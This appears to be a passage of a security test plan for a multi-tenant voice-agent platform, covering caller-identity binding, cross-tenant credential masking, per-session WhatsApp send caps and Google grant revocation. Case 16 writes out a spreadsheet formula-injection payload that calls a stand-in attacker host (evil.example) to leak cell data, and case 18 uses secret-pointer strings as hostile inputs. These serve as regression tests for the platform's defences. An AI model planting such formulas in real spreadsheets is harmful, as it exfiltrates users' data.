14. **Caller identity on find, cancel and reschedule (finding 2, integration).** Every calendar test sends `caller_number`, plus `call_direction="inbound"` and a distinct `called_number` unless the case says otherwise. Without them, every inbound case would now fail closed for the wrong reason.
   - Booking:
     - Book for ANI P1 over two turns. The outbound body has `extendedProperties.private.yuviz_phone == normalize_ani(P1)` and `yuviz_preset == "calendar_booking"`, and the phone is not in `description`. `arguments_redacted.caller_phone == "[redacted]"`.
   - Lookup is bound to the real ANI:
     - A call from ANI P2 requests a cancel with `caller_arguments={"caller_phone": P1, "privateExtendedProperty": "yuviz_phone=" + P1}`. The find mock recorded `privateExtendedProperty=yuviz_phone=<normalize_ani(P2)>` and no `q` param.
     - With the find mock returning P1's event anyway, as if Google's filter had failed, the transform drops it. Nothing is dispatched, and the delete mock recorded zero requests. This proves the second layer independently.
     - A matching-phone event without `yuviz_preset`, or with a non-UUID `id`, is dropped.
     - An empty `caller_number` gives `caller_id_unavailable`, with zero upstream requests on find, book and cancel.
   - Outbound calls (round-3 finding 1). Each must go red under the old `caller_number`-only mapping:
     - **Two callees of one campaign DID.** Every request has `call_direction="outbound"` and `caller_number=D`, where D is a seeded `phone_numbers.did` of this tenant. Book over two turns with `called_number=C1`. The outbound body has `yuviz_phone == normalize_ani(C1)`, not D. Then, as `called_number=C2`, request a cancel. The find mock recorded `privateExtendedProperty=yuviz_phone=<normalize_ani(C2)>`. With the mock returning C1's event anyway, the transform drops it, and the delete mock recorded zero requests. As `called_number=C1`, the same cancel reaches its read-back for C1's event.
     - **Missing direction.** `call_direction=""` with both numbers set gives `caller_id_unavailable` and zero upstream requests on book and find. So do `"test"` and `"sideways"`.
     - **Outbound with no callee.** `call_direction="outbound", called_number=""` fails the same way.
     - **Mislabelled leg.** `call_direction="inbound", caller_number=D` (the tenant's own DID) fails the same way. Delete the `phone_numbers` check in a scratch run and this case must go red (lesson 12).
     - **Ambiguous.** `caller_number == called_number` fails the same way.
   - Read-back and PII:
     - The P1 cancel read-back equals `To confirm, cancel your <service> appointment on Thursday 1 October at 10 AM?` and contains no patient name. The reschedule read-back names both the old and the new time.
     - Plant sentinel `summary`, `description`, attendee email and phone values in the find and PATCH mocks. The `response_redacted` of the find and reschedule steps contains none of them, and the mocks' own bodies prove they were really sent.
   - Unit:
     - `api_exec_executor` posts `caller_number == context.caller_number`, `called_number == context.called_number` and `call_direction == context.call_direction`, set from a context with three distinct values so that swapping any two goes red.
     - `run_turn` from `PipelineConversationHandler`, built with `direction="outbound", called_number=C`, produces a `ToolExecutionContext` with `call_direction == "outbound"` and `called_number == C`. A handler built without `direction` produces `call_direction == ""`.
     - `remote_party_number` table test: inbound picks the caller, outbound picks the callee, and every other direction, empty number or equal pair gives `None`.
     - The `policy_resolver` tool schema for the calendar rows contains neither `caller_phone` nor `privateExtendedProperty`.
15. **Config credential tables (round-3 finding 2, integration against Config's app).** Seed tenants A and B, each with a `provider_configs`, a `tool_provider_configs` and a Vobiz plus a Cloudonix `telephony_configs` row created from plaintext, so every stored value is `enc:`.
   - **Cross-tenant paste is rejected.** Read A's real ciphertext from the DB for each table. As B's admin, a PATCH on B's row with `api_key_ref=<A's ref>` returns 400 `credential_ref_not_accepted`, and so do `credentials.auth_token=<A's>` and `credentials.api_keys=[<A's>]`. The same values on create also return 400. After each attempt, B's row is byte-identical in the DB. In a scratch run, revert the equality check to today's `is_encrypted → keep`, and the PATCH cases must go red.
   - **Unchanged round-trip is preserved.** A PATCH that sends the row's own current ciphertext, byte-identical, and another that sends `"[stored]"` (scalar and `api_keys: ["[stored]"]`) each return 200. The stored value read back from the DB is byte-identical, and the row still validates and decrypts. A PATCH that sends `"[stored]"` as `api_key` returns 400 and stores nothing. `"[stored]"` on create returns 400.
   - **Masked for every role.** For each of `superadmin`, `admin`, `supervisor` and `viewer` (all allowed roles), call every Config route found by walking `app.routes` that returns a row from these tables. Walk the whole JSON body and assert no string starts with `enc:`, and that the credential fields equal `"[stored]"`. Assert the walked-route count equals the enumerated count, so a new route breaks the test (lessons 12, 29). As the platform Conversation service account, the same `GET`s return the sealed `enc:` values. This proves the mask is not over-broad, and that the fixture really contains `enc:` values, so the browser assertion can fail.
   - **Admin-UI round-trip (unit).** `secretPayload("[stored]", "[stored]")` returns `{ api_key_ref: "[stored]" }`, never `{ api_key: … }`. The telephony edit form submits `"[stored]"` for an untouched credential.
16. **Sheets formula injection (round-3 finding 3).** Apply the Sheets preset, then run `sheets_capture_lead` with `name="=IMPORTXML(\"https://evil.example/\"&A2,\"//a\")"` and `phone="+919999999999"`. The append mock recorded a URL whose query has `valueInputOption=RAW`, and no `USER_ENTERED`. Its body's `values[0][0]` equals the exact input string, with no prefix added or stripped, which Sheets stores as literal text under `RAW`. The apply-time header-row request also carries `RAW`. Test 10 adds a live check: the `=…` value is shown as text in the sheet, not evaluated.
17. **Carriers as the fourth ref table (round-4 finding 2, integration against Config's app).** Seed A and B each with a carrier created from a plaintext `auth_token`, so both store `enc:`.
   - Read A's real `auth_token_ref` from the DB. As B's admin, a PATCH on B's carrier with `auth_token_ref=<A's ref>` returns 400 `credential_ref_not_accepted`; so does the same value on create. B's row is byte-identical after each attempt.
   - A PATCH sending B's own current ciphertext byte-identical, and one sending `"[stored]"`, both return 200 and leave the stored value byte-identical.
   - For each of `superadmin`, `admin`, `supervisor` and `viewer`, `GET /tenants/{t}/carriers`, `GET /carriers/{id}`, the create response and the update response all return `auth_token_ref == "[stored]"`, and no string in any body starts with `enc:`. As the DID service's platform service account, the same reads return the sealed value — so the mask is not over-broad and the fixture really contains `enc:`.
   - Delete the `public_carrier` wrap on the list route in a scratch run: the role cases must go red (lesson 12).
   - This whole case is folded into the route-walking masking test of case 15, so `carriers` is covered by the same mechanical enumeration rather than by a second hand-written list.
18. **Pointer schemes are platform-only (round-4 finding 5).**
   - For each of the four tables, a tenant admin's create and update with `api_key_ref="env:OPENAI_API_KEY"` and with `k8s:/var/run/secrets/x` return 400 with the same `credential_ref_not_accepted` text as a rejected `enc:` — the message must not differ by scheme, or it is an oracle.
   - The same requests as a platform-scoped principal succeed and store the pointer verbatim.
   - A row that already holds `env:…` still resolves: the service getter returns the live value and the Conversation service account reads it unmasked.
   - Unit: `resolve_api_key_input` has **no default** for `allow_pointer_schemes`, so omitting it is a `TypeError`. A mechanical check greps every call site of `resolve_api_key_input`, `_normalize_credentials`, `create_carrier` and `update_carrier` and asserts each passes the keyword, and asserts the call-site count, so a new caller cannot be added unseen (lessons 12, 42).
   - Toolexec: creating a `custom_apis` row with `auth_config.key_ref="env:X"` returns 400; a row inserted directly with that value still executes until the script quarantines it, and after quarantine it fails `credential_unavailable` with zero upstream requests.
19. **WhatsApp recipient and send cap (round-4 finding 3, integration).**
   - The `policy_resolver` tool schema for `whatsapp_send_confirmation` contains no recipient field at all — assert the exact property-name set, not just the absence of one name.
   - An inbound call from ANI P1 where the model passes `caller_arguments={"destination": "+919999900000"}`: the Gupshup mock recorded `destination == normalize_ani(P1).lstrip("+")`, never the model's value. The Meta row's `to` is the same, and Interakt's `fullPhoneNumber` keeps the `+`.
   - An **outbound** call with `call_direction="outbound"`, `caller_number=D` (the tenant's own seeded DID) and `called_number=C`: the recipient is `normalize_ani(C)`, not D. This must go red under a `caller_number`-only mapping.
   - `call_direction=""`, `"test"`, an empty number, and `caller_number == called_number` each give `invalid_argument`/`caller_id_unavailable` with **zero** requests to the WhatsApp mock.
   - **Cap:** in one `session_id`, four sends with four different template arguments (so four distinct `arguments_hash` values, which is what defeated the idempotency claim). The first three reach the mock; the fourth returns `unavailable`/`send_cap_reached`, takes **no** `api_side_effect_claims` row and makes **zero** mock requests. Assert the mock's request count is exactly 3, not merely that the fourth failed.
   - A fifth send under a **different** `session_id` succeeds, so the cap is per session and not a global lockout.
   - A request with an empty `session_id` fails closed with the same error and zero requests.
   - Set `session_send_cap` to NULL on the row in a scratch run and all four sends must succeed, proving the cap is what refused the fourth and not some unrelated guard (lesson 12).
20. **Shared Google grant across tenants (round-4 finding 4, integration).**
   - Connect the same Google account in A and B (both token-endpoint mocks return the same `sub`). Both rows carry the same `provider_sub`.
   - A's admin disconnects: A's row is `disconnected` with NULL refs, the revoke mock recorded **zero** requests, the response body is exactly `{"disconnected": true}` with no extra key, and B's row is still `connected`. A `gcal_book` on B's agent still succeeds.
   - Disconnect B as well: now the revoke mock **is** called, with B's old refresh token in the form body.
   - A connection whose `provider_sub` is NULL (simulating a pre-deploy row) revokes on disconnect.
   - Two different Google accounts in A and B: A's disconnect revokes, because the subjects differ. Delete the `provider_sub = $2` predicate in a scratch run and this case must go red (lesson 12).
   - No response body and no audit row from A's disconnect contains B's tenant id, slug or `account_label`; assert over the whole JSON body and the audit `details` (lesson 2).
   - `GET /tenants/{t}/connections` never returns `provider_sub`: assert the exact key set of each connection object.
